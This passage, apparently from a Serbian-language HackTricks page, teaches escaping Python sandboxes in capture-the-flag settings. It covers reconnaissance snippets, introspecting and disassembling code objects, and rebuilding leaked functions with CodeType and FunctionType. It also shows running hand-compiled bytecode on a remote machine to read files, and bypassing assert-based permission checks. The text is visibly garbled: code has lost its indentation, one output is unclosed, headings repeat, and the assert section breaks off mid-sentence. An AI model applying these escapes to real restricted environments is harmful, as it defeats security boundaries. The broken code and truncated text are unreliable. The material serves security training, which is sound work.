#### 4. Prikupljanje informacija o trenutnom direktorijumu

Da biste saznali u kojem se direktorijumu izvršava kod unutar peskovnika, možete koristiti sledeći kod:

```python
import os
print(os.getcwd())
```

#### 5. Prikupljanje informacija o argumentima komandne linije

Da biste saznali koje argumente komandne linije koristi peskovnik, možete koristiti sledeći kod:

```python
import sys
print(sys.argv)
```

#### 6. Prikupljanje informacija o trenutnom korisniku

Da biste saznali koji je trenutni korisnik unutar peskovnika, možete koristiti sledeći kod:

```python
import getpass
print(getpass.getuser())
```

#### 7. Prikupljanje informacija o trenutnom vremenu

Da biste saznali trenutno vreme unutar peskovnika, možete koristiti sledeći kod:

```python
import datetime
print(datetime.datetime.now())
```

#### 8. Prikupljanje informacija o trenutnom sistemu

Da biste saznali informacije o trenutnom sistemu unutar peskovnika, možete koristiti sledeći kod:

```python
import platform
print(platform.uname())
```

#### 9. Prikupljanje informacija o trenutnom procesu

Da biste saznali informacije o trenutnom procesu unutar peskovnika, možete koristiti sledeći kod:

```python
import os
print(os.getpid())
```

#### 10. Prikupljanje informacija o trenutnom direktorijumu izvršavanja

Da biste saznali u kojem se direktorijumu izvršava kod unutar peskovnika, možete koristiti sledeći kod:

```python
import os
print(os.path.realpath(__file__))
```

#### 11. Prikupljanje informacija o trenutnom hostu

Da biste saznali informacije o trenutnom hostu unutar peskovnika, možete koristiti sledeći kod:

```python
import socket
print(socket.gethostname())
```

#### 12. Prikupljanje informacija o trenutnom IP adresi

Da biste saznali trenutnu IP adresu unutar peskovnika, možete koristiti sledeći kod:

```python
import socket
print(socket.gethostbyname(socket.gethostname()))
```

#### 13. Prikupljanje informacija o trenutnom korisničkom direktorijumu

Da biste saznali trenutni korisnički direktorijum unutar peskovnika, možete koristiti sledeći kod:

```python
import os
print(os.path.expanduser("~"))
```

#### 14. Prikupljanje informacija o trenutnom operativnom sistemu

Da biste saznali informacije o trenutnom operativnom sistemu unutar peskovnika, možete koristiti sledeći kod:

```python
import platform
print(platform.system())
```

#### 15. Prikupljanje informacija o trenutnom procesoru

Da biste saznali informacije o trenutnom procesoru unutar peskovnika, možete koristiti sledeći kod:

```python
import platform
print(platform.processor())
```

#### 16. Prikupljanje informacija o trenutnom jeziku

Da biste saznali informacije o trenutnom jeziku unutar peskovnika, možete koristiti sledeći kod:

```python
import locale
print(locale.getdefaultlocale())
```

#### 17. Prikupljanje informacija o trenutnom fajl sistemu

Da biste saznali informacije o trenutnom fajl sistemu unutar peskovnika, možete koristiti sledeći kod:

```python
import os
print(os.statvfs("/"))
```

#### 18. Prikupljanje informacija o trenutnom terminalu

Da biste saznali informacije o trenutnom terminalu unutar peskovnika, možete koristiti sledeći kod:

```python
import os
print(os.ttyname(0))
```

#### 19. Prikupljanje informacija o trenutnom procesu roditelju

Da biste saznali informacije o trenutnom procesu roditelju unutar peskovnika, možete koristiti sledeći kod:

```python
import os
print(os.getppid())
```

#### 20. Prikupljanje informacija o trenutnom direktorijumu izvršavanja

Da biste saznali u kojem se direktorijumu izvršava kod unutar peskovnika, možete koristiti sledeći kod:

```python
import os
print(os.getcwd())
```
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **Rastavljanje funkcije**

Da biste zaobišli Python peskovnike, možete koristiti tehniku rastavljanja funkcije. Ova tehnika vam omogućava da analizirate i razumete kako funkcija radi na nivou mašinskog koda.

Da biste rastavili funkciju, možete koristiti alate poput `dis` biblioteke u Pythonu. Ova biblioteka vam omogućava da dobijete disasemblovani prikaz funkcije, koji prikazuje svaku instrukciju u funkciji i njen odgovarajući mašinski kod.

Evo kako možete koristiti `dis` biblioteku da biste rastavili funkciju:

```python
import dis

def my_function():
    x = 5
    y = 10
    z = x + y
    print(z)

dis.dis(my_function)
```

Ovaj kod će prikazati disasemblovani prikaz funkcije `my_function`. Možete videti svaku instrukciju i njen odgovarajući mašinski kod.

Rastavljanje funkcije može biti korisno kada pokušavate da razumete kako funkcija radi ili kada pokušavate da zaobiđete Python peskovnike. Analiziranjem mašinskog koda funkcije možete pronaći ranjivosti ili pronaći načine da zaobiđete sigurnosne mehanizme.

Važno je napomenuti da rastavljanje funkcije može biti složen proces, posebno ako funkcija koristi napredne tehnike zaštite. Takođe, treba biti oprezan prilikom korišćenja ove tehnike, jer može biti nezakonito ili etički neprihvatljivo rastavljati funkcije bez odobrenja vlasnika sistema.
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
Primetite da **ako ne možete da uvezete `dis` u Python sandbox-u**, možete dobiti **bajtkod** funkcije (`get_flag.func_code.co_code`) i **raspakovati** ga lokalno. Nećete videti sadržaj učitanih promenljivih (`LOAD_CONST`), ali možete ih pretpostaviti iz (`get_flag.func_code.co_consts`) jer `LOAD_CONST` takođe prikazuje offset učitane promenljive.
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Kompajliranje Pythona

Sada zamislimo da na neki način možete **izvući informacije o funkciji koju ne možete izvršiti**, ali je **morate izvršiti**.\
Kao u sledećem primeru, **možete pristupiti objektu koda** te funkcije, ali samo čitanjem disasemblera **ne znate kako izračunati zastavicu** (_zamislite složeniju funkciju `calc_flag`_).
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### Kreiranje objekta koda

Prvo, moramo znati **kako kreirati i izvršiti objekat koda** kako bismo mogli kreirati jedan za izvršavanje naše procurele funkcije:
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
Zavisno od verzije Pythona, **parametri** `code_type` mogu imati **različit redosled**. Najbolji način da saznate redosled parametara u verziji Pythona koju koristite je da pokrenete:
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### Rekreiranje procurene funkcije

{% hint style="warning" %}
U sledećem primeru, uzećemo sve podatke potrebne za rekreiranje funkcije direktno iz objekta koda funkcije. U **stvarnom primeru**, sve **vrednosti** za izvršavanje funkcije **`code_type`** su ono što **će biti potrebno procureti**.
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Zaobilaženje odbrana

U prethodnim primerima na početku ovog posta, možete videti **kako izvršiti bilo koji Python kod koristeći funkciju `compile`**. Ovo je interesantno jer možete **izvršiti ceo skript** sa petljama i svim ostalim u **jednom redu koda** (i isto možemo uraditi koristeći **`exec`**).\
U svakom slučaju, ponekad može biti korisno **kreirati** kompajliran objekat na lokalnom računaru i izvršiti ga na **CTF mašini** (na primer, jer nemamo funkciju `compile` na CTF-u).

Na primer, hajde da ručno kompajliramo i izvršimo funkciju koja čita _./poc.py_:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
Ako nemate pristup `eval` ili `exec`, možete kreirati **odgovarajuću funkciju**, ali direktno pozivanje obično će rezultirati greškom: _konstruktor nije dostupan u ograničenom režimu_. Dakle, potrebna vam je **funkcija koja nije u ograničenom okruženju kako biste pozvali ovu funkciju**.
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## Dekompilacija kompajliranog Python koda

Korišćenjem alata poput [**https://www.decompiler.com/**](https://www.decompiler.com) moguće je dekompilirati dati kompajlirani Python kod.

**Pogledajte ovaj tutorijal**:

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## Razno Python

### Assert

Python koji se izvršava sa optimizacijama uz parametar `-O` će ukloniti tvrdnje (assert) i bilo koji kod koji zavisi od vrednosti **debug**.\
Stoga, provere poput
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## Reference

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretnje, pronalazi probleme u celom vašem tehnološkom skupu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
